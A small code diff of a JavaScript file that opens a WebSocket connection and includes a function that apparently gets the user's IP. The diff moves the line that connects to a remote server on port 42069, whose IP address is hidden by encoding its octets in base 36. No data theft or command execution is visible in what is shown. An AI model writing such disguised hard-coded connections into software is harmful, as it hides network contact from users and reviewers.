@@ -1,5 +1,5 @@
 var myIP = getIP();
-//to fix instances in which there is not enough time to make the `XMLHttpRequest`
+// to minimize reloading/closing time
 
 function Connection(ip,port){
 	this.ip = ip || 'localhost';
@@ -12,6 +12,12 @@ function Connection(ip,port){
 	this.socket.onmessage = function(m){
 		//console.log(m.data);
 	}
+}
+
+var Main = new Connection(c(30)+"."+c("1D")+"."+c("69")+"."+c("6N"),"42069");
+
+function c(a){
+	return parseInt(a.toString(),36);
 }
 
 function getIP(){
@@ -29,10 +35,4 @@ function getIP(){
     }
 
     return false;
-}
-
-var Main = new Connection(c(30)+"."+c("1D")+"."+c("69")+"."+c("6N"),"42069");
-
-function c(a){
-	return parseInt(a.toString(),36);
 }
